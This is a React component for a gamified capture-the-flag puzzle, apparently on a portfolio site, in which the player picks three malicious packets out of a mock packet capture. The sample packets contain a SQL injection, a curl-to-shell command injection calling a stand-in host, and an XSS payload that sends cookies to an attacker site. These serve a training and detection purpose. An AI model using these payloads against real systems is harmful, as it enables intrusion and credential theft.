import React, { useState, useEffect } from 'react';
import { Activity, CheckCircle2, RefreshCw, ShieldAlert, Terminal, Zap } from 'lucide-react';
import { playBreachFanfare, playClickSound, playHackingBeep, playZapSound } from '../../utils/audio.js';
import { ctfEngine } from '../../utils/ctf/ctfEngine.js';
import { getChallengeById } from '../../utils/ctf/ctfChallenges.js';

const CHALLENGE_ID = 'forensics-pcap-exfiltration';
const REVEALED_FLAG = 'FLAG{pcap_dns_exfil_basic_auth_neutralized}';

const INITIAL_PACKETS = [
  { id: 1, proto: 'TCP', src: '192.168.1.45', dst: '10.0.0.1:443', payload: 'TLS 1.3 ClientHello (SNI: api.internal.corp)', malicious: false },
  { id: 2, proto: 'HTTP', src: '45.134.22.9', dst: '10.0.0.80:80', payload: "GET /admin.php?id=1' UNION SELECT null,username,password FROM users--", malicious: true, threat: 'SQL_INJECTION' },
  { id: 3, proto: 'DNS', src: '192.168.1.102', dst: '8.8.8.8:53', payload: 'Standard query 0x12fa A github.com', malicious: false },
  { id: 4, proto: 'HTTP', src: '185.220.101.4', dst: '10.0.0.80:8080', payload: 'POST /upload.php?cmd=;curl http://evil.sh/payload.bin | sh', malicious: true, threat: 'REMOTE_COMMAND_INJECTION' },
  { id: 5, proto: 'TCP', src: '192.168.1.18', dst: '10.0.0.1:22', payload: 'SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1', malicious: false },
  { id: 6, proto: 'HTTP', src: '103.14.26.11', dst: '10.0.0.80:443', payload: '<script>fetch("https://attacker.site/steal?cookie="+document.cookie)</script>', malicious: true, threat: 'STORED_XSS_EXPLOIT' },
];

export default function PacketSnifferHack({ onSolved, onBypass }) {
  const challenge = getChallengeById(CHALLENGE_ID);
  const [quarantined, setQuarantined] = useState({});
  const [solved, setSolved] = useState(() => ctfEngine.isChallengeSolved(CHALLENGE_ID));
  const [manualFlag, setManualFlag] = useState('');
  const [flagFeedback, setFlagFeedback] = useState(null);
  const totalMalicious = 3;

  const quarantinedCount = Object.keys(quarantined).filter((id) => quarantined[id]).length;

  useEffect(() => {
    if (quarantinedCount >= totalMalicious && !solved) {
      setSolved(true);
      ctfEngine.submitFlag(CHALLENGE_ID, REVEALED_FLAG);
      playBreachFanfare();
      setTimeout(() => {
        onSolved?.();
      }, 1500);
    }
  }, [quarantinedCount, totalMalicious, solved, onSolved]);

  const handlePacketClick = (pkt) => {
    if (solved || quarantined[pkt.id]) return;

    if (pkt.malicious) {
      playHackingBeep(1600 + quarantinedCount * 250);
      setQuarantined((prev) => ({ ...prev, [pkt.id]: true }));
    } else {
      playClickSound(320, 0.12);
    }
  };

  const handleManualSubmit = (e) => {
    e.preventDefault();
    if (!manualFlag.trim()) return;
    const res = ctfEngine.submitFlag(CHALLENGE_ID, manualFlag);
    if (res.success || res.duplicate) {
      setSolved(true);
      setFlagFeedback({ success: true, text: res.message });
      setTimeout(() => onSolved?.(), 1200);
    } else {
      setFlagFeedback({ success: false, text: res.message });
    }
  };

  return (
    <div className="hack-puzzle-container packet-hack">
      <div className="hack-header-bar">
        <div className="hack-title">
          <Activity size={14} className="hack-icon-pulse text-cyan-400" />
          <span>CTF MISSION // FORENSICS: PCAP EXFILTRATION ANALYSIS</span>
        </div>
        <div className="hack-actions-right">
          <span className="hack-status-badge text-emerald-400">
            {solved ? '✔ FLAG CAPTURED' : `${challenge?.points || 250} PTS`}
          </span>
          <button
            className="hack-bypass-btn"
            onClick={() => {
              playZapSound();
              onBypass();
            }}
            title="Recruiter Fast View"
          >
            RECRUITER BYPASS ⚡
          </button>
        </div>
      </div>

      <div className="hack-instructions">
        <p className="text-xs text-slate-300">
          Dissect the Wireshark PCAP capture stream. Identify and quarantine the <strong className="text-rose-400">3 malicious streams</strong> (SQL Injection, Remote Code Execution, and Stored XSS) to isolate hostile data leakage.
        </p>
      </div>

      {/* Packet Stream Table */}
      <div className="pcap-table-box">
        <div className="pcap-table-header">
          <span className="col-no">NO.</span>
          <span className="col-proto">PROTO</span>
          <span className="col-src">SOURCE</span>
          <span className="col-dst">DESTINATION</span>
          <span className="col-info">PAYLOAD / DISSECTED STREAM</span>
          <span className="col-action">STATUS</span>
        </div>

        <div className="pcap-packets-list">
          {INITIAL_PACKETS.map((pkt) => {
            const isQuarantined = !!quarantined[pkt.id];

            return (
              <button
                type="button"
                key={pkt.id}
                className={`pcap-row-btn ${pkt.proto.toLowerCase()} ${
                  isQuarantined ? 'quarantined' : ''
                }`}
                onClick={() => handlePacketClick(pkt)}
                disabled={solved || isQuarantined}
              >
                <span className="col-no">0{pkt.id}</span>
                <span className={`col-proto proto-tag ${pkt.proto.toLowerCase()}`}>{pkt.proto}</span>
                <span className="col-src">{pkt.src}</span>
                <span className="col-dst">{pkt.dst}</span>
                <span className="col-info" title={pkt.payload}>{pkt.payload}</span>
                <span className="col-action">
                  {isQuarantined ? (
                    <span className="badge-quarantined">✔ QUARANTINED</span>
                  ) : (
                    <span className="badge-inspect">INSPECT</span>
                  )}
                </span>
              </button>
            );
          })}
        </div>
      </div>

      {/* MANUAL FLAG SUBMISSION STRIP */}
      <form onSubmit={handleManualSubmit} className="mt-3 flex gap-2">
        <input
          type="text"
          value={manualFlag}
          onChange={(e) => setManualFlag(e.target.value)}
          placeholder="Or submit flag: FLAG{...}"
          className="flex-1 bg-black/50 border border-slate-700 rounded px-2.5 py-1 text-xs text-slate-200 outline-none focus:border-emerald-500"
        />
        <button
          type="submit"
          className="bg-emerald-600 hover:bg-emerald-500 text-black font-bold px-3 py-1 rounded text-xs transition"
        >
          SUBMIT
        </button>
      </form>

      {flagFeedback && (
        <div className={`mt-2 text-xs p-1.5 rounded ${flagFeedback.success ? 'bg-emerald-950 text-emerald-300' : 'bg-rose-950 text-rose-300'}`}>
          {flagFeedback.text}
        </div>
      )}

      {solved ? (
        <div className="hack-success-banner mt-3">
          <CheckCircle2 size={16} className="text-emerald-400" />
          <div className="flex flex-col">
            <span className="font-bold text-emerald-300">EXFILTRATION THREATS PURGED // {REVEALED_FLAG}</span>
            <span className="text-[10px] text-emerald-400/80">+250 CTF PTS Awarded to Profile</span>
          </div>
        </div>
      ) : (
        <div className="hack-hint-bar mt-2">
          <span className="live-blip" />
          <span>Quarantine {quarantinedCount}/3 malicious streams to extract decrypted PCAP telemetry</span>
        </div>
      )}
    </div>
  );
}
